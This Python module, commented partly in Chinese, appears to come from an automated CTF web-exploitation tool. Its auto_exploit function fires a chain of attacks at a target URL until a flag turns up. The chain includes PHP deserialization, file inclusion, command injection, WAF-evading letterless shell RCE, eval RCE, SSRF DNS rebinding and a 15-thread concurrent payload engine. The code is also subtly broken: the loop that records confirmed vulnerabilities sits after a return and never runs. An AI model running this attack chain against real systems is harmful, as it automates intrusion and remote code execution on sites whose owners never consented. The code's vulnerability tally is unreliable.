"""yang_web.core.url_analyzer._attacks 子模块 _orchestrator（自 _attacks.py 拆分，请勿手工重排）。"""

from urllib.parse import urlparse, parse_qs, unquote, urlencode, urlunparse, quote
from urllib.request import Request, urlopen
from typing import List, Dict, Tuple, Optional, Callable
import re
import time
import html as _html
from .._engines import (AdaptiveScheduler, ConcurrentEngine, execute_attack)
from .._http import (FLAG_RE, USER_AGENT, send_request)

from ._extract import (_scan_static_flag)
from ._generic_rce import (_try_bashfuck_exploit, _try_length_limit_rce_exploit)
from ._php_funcs import (_try_php_dynamic_func, _try_php_logic_bypass)
from ._php_rce import (_execute_php_bypass, _try_php_eval_rce_exploit, _try_php_lfi_exploit, _try_php_unserialize_exploit)




def auto_exploit(url, results, on_progress=None, on_found=None, fingerprint=None):
    """v3.0 自动解题 — 并发引擎 + 自适应调度 + 智能提权.

    Uses ConcurrentEngine for parallel attacks and AdaptiveScheduler
    for context-aware payload ordering.

    Args:
        url: Target URL
        results: Analysis results from analyze_url()
        on_progress: Callable(stage, item, status)
        on_found: Callable(flag) — fire-once flag callback
        fingerprint: SmartFingerprinter result dict (optional, for scheduling)

    Returns:
        {"flag": str or None, "vuln_confirmed": [dict],
         "attacks_run": int, "stages": [str], "timing_ms": int}
    """
    t_start = time.time()
    vuln_confirmed = []
    attacks_run = 0
    stages = []

    # ── v3.2: PHP Logic Bypass (regex+intval+sha1+assignment) ──
    fp_early = fingerprint or {'_clean_source': '', '_url': url}
    logic_result = _try_php_logic_bypass(url, fp_early, on_progress=on_progress, on_found=on_found)
    if logic_result and logic_result.get('flag'):
        logic_result['stages'] = ['php_logic_bypass']
        return logic_result

    # ── v3.1: PHP Bypass routing (only return if flag found) ──
    for r in results:
        if r.get('type') == 'PHP_BYPASS':
            bypass_plan = r.get('_bypass_plan')
            if bypass_plan:
                bp_result = _execute_php_bypass(url, bypass_plan,
                                                on_progress=on_progress,
                                                on_found=on_found)
                # v3.6fix: only short-circuit if flag actually found
                if bp_result and bp_result.get('flag'):
                    bp_result['stages'] = ['php_bypass']
                    return bp_result
                # Otherwise fall through to continue attack chain

    def _found_once(flag):
        """Ensure on_found is called exactly once."""
        if on_found and not getattr(_found_once, '_called', False):
            _found_once._called = True
            try:
                on_found(flag)
            except Exception:
                pass

    def _emit(stage, item, status):
        if on_progress:
            try:
                on_progress(stage, item, status)
            except Exception:
                pass

    # ── v3.6: PHP 反序列化漏洞自动检测与利用 ──
    _emit('plan', 'PHP反序列化检测', '检查unserialize()调用...')
    unserialize_result = _try_php_unserialize_exploit(
        url, results, fp_early, on_progress=on_progress, on_found=on_found)
    if unserialize_result and unserialize_result.get('flag'):
        unserialize_result['stages'] = ['php_unserialize']
        return unserialize_result

    # ── v3.7: PHP 文件包含漏洞自动检测与利用 ──
    _emit('plan', 'PHP文件包含检测', '检查 include/require 调用...')
    lfi_result = _try_php_lfi_exploit(
        url, results, fp_early, on_progress=on_progress, on_found=on_found)
    if lfi_result and lfi_result.get('flag'):
        lfi_result['stages'] = ['php_file_inclusion']
        return lfi_result

    # ── 简单命令注入直接探测 (无WAF场景, 秒杀 system($_POST[x])) ──
    _emit('plan', '简单RCE检测', '直接命令注入探测...')
    try:
        from yang_web.core.simple_cmd_rce import simple_cmd_rce as _scmdrce
        _scmdrce_result = _scmdrce(url, on_progress=lambda s, i, t: _emit(s, i, t))
        if _scmdrce_result and _scmdrce_result.get('flag'):
            if on_found:
                try:
                    on_found(_scmdrce_result['flag'])
                except Exception:
                    pass
            return {
                'flag': _scmdrce_result['flag'],
                'vuln_confirmed': [{
                    'type': 'SIMPLE_CMD_RCE',
                    'param': _scmdrce_result.get('param'),
                    'method': _scmdrce_result.get('method'),
                    'cmd': _scmdrce_result.get('cmd'),
                }],
                'attacks_run': 0,
                'stages': ['simple_cmd_rce'],
                'timing_ms': int((time.time() - t_start) * 1000),
            }
    except Exception:
        pass

    # ── v3.7: bashFuck 无字母命令执行自动检测与利用 ──
    _emit('plan', 'bashFuck检测', '检查 system/exec + WAF...')
    bf_result = _try_bashfuck_exploit(
        url, results, fp_early, on_progress=on_progress, on_found=on_found)
    if bf_result and bf_result.get('flag'):
        bf_result['stages'] = ['bashfuck_no_alpha_rce']
        return bf_result

    # ── v3.8: PHP MD5碰撞 + eval RCE 自动检测与利用 ──
    _emit('plan', 'PHP-EvalRCE检测', '检查 eval() + MD5碰撞 + WAF...')
    eval_rce_result = _try_php_eval_rce_exploit(
        url, results, fp_early, on_progress=on_progress, on_found=on_found)
    if eval_rce_result and eval_rce_result.get('flag'):
        eval_rce_result['stages'] = ['php_eval_rce']
        return eval_rce_result

    # ── v3.7: SSRF DNS Rebinding → RCE ──
    _emit('plan', 'SSRF-Rebind检测', '检查 gethostbyname + popen...')
    from yang_web.core.ssrf_rebind import auto_solve as sr_auto_solve
    sr_result = sr_auto_solve(url, on_progress=lambda s,i,t: _emit(s,i,t))
    if sr_result and sr_result.get('flag'):
        if on_found:
            try: on_found(sr_result['flag'])
            except Exception: pass
        return {
            'flag': sr_result['flag'],
            'stages': ['ssrf_dns_rebind'],
            'vuln_confirmed': [{'type': 'SSRF_DNS_REBIND_RCE',
                                 'bypass': sr_result.get('bypass')}],
        }

    # ── Phase 1: Build adaptive attack plan ──
    _emit('plan', '构建攻击计划', '智能调度中...')

    # Use fingerprint if available, otherwise create a minimal one
    fp = fingerprint or {'php_vulns': [], 'php_params': [], 'waf': None,
                          'cms': 'Unknown', 'cms_confidence': 0,
                          'tech_stack': [], '_url': url}
    if '_url' not in fp:
        fp['_url'] = url

    scheduler = AdaptiveScheduler()
    tasks = scheduler.schedule(results, fp)

    if tasks:
        _emit('plan', f'攻击计划就绪', f'{len(tasks)} 个任务 | 优先: {tasks[0].get("payload_def",{}).get("name","?")}')

        # ── Phase 2: Concurrent attack batch ──
        _emit('attack', '并发攻击启动', f'{len(tasks)} 任务 × {min(15, len(tasks))} 并发')
        stages.append('concurrent_attack')

        engine = ConcurrentEngine(max_workers=15, timeout=5, retries=2)

        # Track results from batch execution
        batch_results, engine_flag = engine.attack_batch(
            tasks,
            on_progress=lambda stage, item, status: _emit(stage, item, status),
            on_flag=lambda f: _found_once(f))

        attacks_run = len(batch_results)

        # Check engine-returned flag first
        if engine_flag:
            _found_once(engine_flag)
            timing = int((time.time() - t_start) * 1000)
            return {
                'flag': engine_flag,
                'flag_found_by': 'concurrent_engine',
                'vuln_confirmed': vuln_confirmed,
                'attacks_run': attacks_run,
                'stages': stages + ['flag_in_batch'],
                'timing_ms': timing,
            }

            # Collect confirmed vulns from batch results
            for res in batch_results:
                analysis = res.get('analysis', {})
                if analysis.get('success'):
                    vuln_confirmed.append({
                        'type': res.get('payload_name', '?'),
                        'param': res.get('param', '?'),
                        'payload': res.get('payload_name', '?'),
                        'evidence': analysis.get('detail', '')[:120],
                    })

        _emit('attack', f'攻击完成', f'{attacks_run} 次 | 确认 {len(vuln_confirmed)} 漏洞')
    else:
        _emit('plan', '无攻击目标', '跳过并发攻击，直接扫描...')
        attacks_run = 0

    timing = int((time.time() - t_start) * 1000)
    
    # Fallback: scan HTML source for hidden flags
    _emit('post', '扫描静态资源', '检查HTML注释/响应体...')
    static_result = _scan_static_flag(url, on_progress=on_progress, on_found=on_found)
    if static_result and static_result.get('flag'):
        static_result['stages'] = stages + ['static_scan_fallback']
        return static_result
    
    # v3.1: PHP dynamic function execution challenge
    _emit('post', '检测PHP动态执行', '尝试session+POST...')
    php_result = _try_php_dynamic_func(url, fp, on_progress=on_progress, on_found=on_found)
    if php_result and php_result.get('flag'):
        php_result['stages'] = stages + ['php_dynamic_func']
        return php_result

    # v3.3: bashFuck 无字母命令执行检测 (二进制替换绕过WAF)
    _emit('post', 'bashFuck检测', '检测无字母数字WAF...')
    bf_result = _try_bashfuck_exploit(url, results, fp, on_progress=on_progress, on_found=on_found)
    if bf_result and bf_result.get('flag'):
        bf_result['stages'] = stages + ['bashfuck_rce']
        return bf_result
    
    # v3.5: 长度限制 RCE (7字符限制 + 数字参数名 $_GET[1])
    _emit('post', '长度限制RCE', '探测数字参数名+长度上限...')
    len_result = _try_length_limit_rce_exploit(url, results, fp, on_progress=on_progress, on_found=on_found)
    if len_result and len_result.get('flag'):
        len_result['stages'] = stages + ['length_limit_rce']
        return len_result

    return {
        'flag': None,
        'vuln_confirmed': vuln_confirmed,
        'attacks_run': attacks_run,
        'stages': stages + ['completed'],
        'timing_ms': timing,
    }
